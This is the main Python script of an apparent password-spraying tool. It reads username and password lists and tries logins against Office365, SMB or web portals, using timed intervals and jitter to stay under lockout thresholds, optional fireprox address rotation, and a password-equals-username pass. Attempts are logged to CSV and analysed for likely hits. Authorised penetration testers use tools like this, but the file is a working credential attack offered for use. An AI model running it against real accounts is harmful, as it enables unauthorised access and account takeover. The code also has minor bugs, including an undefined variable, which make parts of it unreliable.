#!/usr/bin/env python3

import time
import datetime
import json
import os
import sys
import csv
from targets import *
import logging
import analyze
import requests
import warnings
import random
from time import sleep
import click 
import click_config_file
import notifier

# initalize colors object
colors = analyze.Color()

CONTEXT_SETTINGS = dict(help_option_names=['-h', '--help', 'help'])
@click.command(no_args_is_help=True, context_settings=CONTEXT_SETTINGS)
@click.option('-p', "--passwords", 'passlist', required=True, help="Filepath of the passwords list or a single password to spray.")
@click.option('-u', "--usernames", 'userlist', required=True, help="Filepath of the usernames list.")
@click.option('-H', "--host", required=False, type=str, help="Host to password spray (ip or hostname). Can by anything when using Office365 module - only used for logfile name.")
@click.option('-m', "--module", required=True, help="Module corresponding to target host.")
@click.option('-o', "--output", 'csvfile', required=False, help="Name and path of output csv where attempts will be logged.", default='output.csv')
@click.option('-a', "--attempts", required=False, type=int, help="Number of logins submissions per interval (for each user).")
@click.option('-i', "--interval", required=False, type=int, help="Minutes inbetween login intervals.")
@click.option('-e', "--equal", required=False, type=int, help="Does 1 spray for each user where password = username.")
@click.option('-t', "--timeout", required=False, type=int, help="Web request timeout threshold. default is 5 seconds.", default=5)
@click.option('-P', "--port", required=False, type=int, help="Port to connect to on the specified host. Default is 443.", default=443)
@click.option('-f', "--fireprox", required=False, type=str, help="The url of the fireprox interface, if you are using fireprox.")
@click.option('-d', "--domain", required=False, type=str, help="HTTP: Prepend DOMAIN\\ to usernames. SMB: Supply domain for smb connection.")
@click.option("--analyze", 'analyze_results', required=False, type=str, help="Run the results analyzer after each spray interval. False positives are more likely")
@click.option("-j", "--jitter", required=False, type=int, help="Jitter time between requests in seconds.")
@click.option("-jm", "--jitter-min", required=False, type=int, help="Minimum time between requests in seconds.")
@click.option("-n", "--notify", required=False, type=click.Choice(['slack', 'twillio']))
@click_config_file.configuration_option()

def args(passlist, userlist, host, module, csvfile, attempts, interval, equal, timeout, port, fireprox, domain, analyze_results, jitter, jitter_min, notify):

    """Low and slow password spraying tool..."""

    # if any other module than Office365 is specified, make sure hostname was provided
    if module.lower() != 'office365' and not host:
        colors.color_print('[!] Hostname (-H) of target (mail.targetdomain.com) is required for all modules execept Office365', colors.red)
        exit()
    elif module.lower() == 'office365' and not host:
        host = "Office365" # set host to Office365 for the logfile name
    elif module.lower() == 'smb' and (timeout != 5 or fireprox or port != 443):
        colors.color_print('[!] Fireprox (-f), port (-b) and timeout (-t) are incompatible when spraying over SMB', colors.yellow)

    # get usernames from file
    try:
        with open(userlist, 'r') as f:
            users = f.read().splitlines()
    except Exception:
        colors.color_print(f'[!] Error reading usernames from file: {userlist}', colors.red)
        exit()

    # get passwords from file, otherwise treat arg as a single password to spray
    try:
        with open(passlist, 'r') as f:
            passwords = f.read().splitlines()
    except Exception:
        passwords = [passlist]

    # check that interval and attempt args are supplied together
    if interval and not attempts:
        colors.color_print('[!] Number of login attempts per interval (-a) required with -i', colors.red)
        exit()
    elif not interval and attempts:
        colors.color_print('[!] Minutes per interval (-i) required with -a', colors.red)
        exit()
    elif not interval and not attempts and len(passwords) > 1:
        colors.color_print('[*] You have not provided spray attempts/interval. This may lead to account lockouts', colors.yellow)
        print()
        input('Press enter to continue anyways:')

    # Check that jitter flags aren't supplied independently
    if jitter_min and not jitter:
        colors.color_print("--jitter-min flag must be set with --jitter flag", colors.red)
        exit()
    elif jitter and not jitter_min:
        colors.color_print("--jitter flag must be set with --jitter-min flag", colors.red)
        exit()
    if jitter and jitter_min and jitter_min >= jitter:
        colors.color_print("--jitter flag must be greater than --jitter-min flag", colors.red)
        exit()

    # Only allow notification params from config file
    if notify and not config:
        colors.color_print("No config file specified", colors.red)
        exit()

    return users, passwords, host, csvfile, attempts, interval, equal, module, timeout, port, fireprox, domain, userlist, passlist, analyze_results, jitter, jitter_min

def check_sleep(login_attempts, attempts, interval, csvfile, analyze_results):
    if login_attempts == attempts:
        if analyze_results:
            analyzer = analyze.Analyzer(csvfile)
            analyzer.analyze()
        else:
            print()
        colors.color_print(f'[*] Sleeping until {(datetime.datetime.now() + datetime.timedelta(minutes=interval)).strftime("%m-%d %H:%M:%S")}', colors.yellow)
        time.sleep(interval * 60)
        print()
        return 0
    else:
        return login_attempts



def check_file_contents(file_path, current_list):
    new_list = []
    try:
        with open(file_path, 'r') as f:
            new_list = f.read().splitlines()
    except:
        # file either no longer exists, or -p flag was given a password and not a file
        pass
    
    additions = list(set(new_list) - set(current_list))
    return additions    


def print_attempt(username, password, response, csvfile):
    if response == 'timeout':
        code = 'TIMEOUT'
        length = 'TIMEOUT'
    else:
        code = response.status_code
        length = str(len(response.content))
    print('%-27s %-17s %13s %15s' % (username, password, code, length))
    output = open(csvfile, 'a')
    output.write('%s,%s,%s,%s\n' % (username, password, code, length))
    output.close() 


def login(target, username, password, csvfile):
    try:
        response = target.login(username, password)
        target.print_response(response, csvfile)
    except requests.ConnectTimeout as e:
        target.print_response(response, csvfile, timeout=True)
    except (requests.ConnectionError, requests.ReadTimeout) as e:
        colors.color_print('\n[!] Connection error - sleeping for 5 seconds', colors.red)
        sleep(5)
        login(target, username, password, csvfile)


def ascii():
    print(f'''

{colors.yellow} ___  ___  ___  ___  _ _ {colors.blue} ___  _ _  ___  ___  _    ___  ___ 
{colors.yellow}/ __>| . \| . \| . || | |{colors.blue}|  _>| | || . || . \| |  | __>/ __>
{colors.yellow}\__ \|  _/|   /|   |\   /{colors.blue}| <__|   ||   ||   /| |_ | _> \__ \\
{colors.yellow}<___/|_|  |_\_\|_|_| |_| {colors.blue}`___/|_|_||_|_||_\_\|___||___><___/
                                                            
{colors.end}''')


def main():
    requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
    users, passwords, host, csvfile, attempts, interval, equal, module, timeout, port, fireprox, domain, userfile, passfile, analyze_results, jitter, jitter_min = args()
    # try to instantiate the specified module
    try:
        module = module.title()
        mod_name = getattr(sys.modules[__name__], module)
        class_name = getattr(mod_name, module)
        target = class_name(host, port, timeout, fireprox)
    except AttributeError:
        print(f'[!] Error loading {module} module. {module} is spelled incorrectly or does not exist')
        exit()

    # create the log file
    if not os.path.isdir('logs'):
        os.mkdir('logs')
    log_name = 'logs/%s.log' % host
    logging.basicConfig(filename=log_name, level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

    ascii()

    colors.color_print('[*] Target Module: ', colors.blue, '')
    print(module)

    colors.color_print('[*] Spraying: ', colors.blue, '')
    print(target.url)

    if attempts:
        colors.color_print('[*] Interval: ', colors.blue, '')
        print(f'Attempting {attempts} login(s) per user every {interval} minutes')
    
    if jitter:
        colors.color_print('[*] Jitter: ', colors.blue, '')
        print(f'Random {jitter_min}-{jitter} second delay between each login attempt.')

        
    colors.color_print('[*] Log of event times: ', colors.blue, '')
    print(log_name)

    colors.color_print('[*] Log of spray results: ', colors.blue, '')
    print(csvfile)


    print()
    input('Press enter to begin:')
    print()

    # if spraying over SMB, test connection to target and get host info
    if module == "Smb":
        colors.color_print(f'[*] Initiaing SMB connection to {host} ...', colors.yellow)
        if target.get_conn():
            colors.color_print(f'[+] Connected to {host} over {"SMBv1" if target.smbv1 else "SMBv3"}', colors.green)
            colors.color_print('\t[>] Hostname:  ', colors.blue, '')
            print(target. hostname)
            colors.color_print('\t[>] Domain:    ', colors.blue, '')
            print(target.domain)
            colors.color_print('\t[>] OS:        ', colors.blue, '')
            print(target.os)
            print()
        else:
            colors.color_print(f'[!] Failed to connect to {host} over SMB', colors.red)
            exit()

    target.print_headers(csvfile)

    login_attempts = 0

    # spray once with password = username if flag present
    if equal:
        for username in users:
            pword = username.split('@')[0]
            if jitter is not None:
                if jitter_min is None:
                    jitter_min = 0
                time.sleep(random.randint(jitter_min,jitter))
            login(target, username, pword, csvfile)
            
            # log the login attempt
            logging.info(f'Login attempted as {username}')

        login_attempts += 1

    # spray using password file
    for password in passwords:
        # trigger sleep if attempts limit hit
        login_attempts = check_sleep(login_attempts, attempts, interval, csvfile, analyze_results)

        # check if user/pass files have been updated and add new entries to current lists
        # this will let users add (but not remove) users/passwords into the spray as it runs
        new_users = check_file_contents(userfile, users)
        new_passwords = check_file_contents(passfile, passwords)
        
        if len(new_users) > 0:
            colors.color_print(f'[>] Adding {len(new_users)} new users into the spray!', colors.blue)
            users.extend(new_users)

        if len(new_passwords) > 0:
            colors.color_print(f'[>] Adding {len(new_passwords)} new passwords to the end of the spray!', colors.blue)
            passwords.extend(new_passwords)

        # print line separator
        if len(new_passwords) > 0 or len(new_users) > 0:
            print()

        for username in users:
            if domain:
                username = f'{domain}\\{username}'
            if jitter is not None:
                if jitter_min is None:
                    jitter_min = 0
                time.sleep(random.randint(jitter_min,jitter))
            login(target, username, password, csvfile)
            
            # log the login attempt
            logging.info(f'Login attempted as {username}')
            
        login_attempts += 1
    
    # analyze the results to point out possible hits
    analyzer = analyze.Analyzer(csvfile)
    analyzer.analyze()
    

# stock boilerplate
if __name__ == '__main__':
    main()
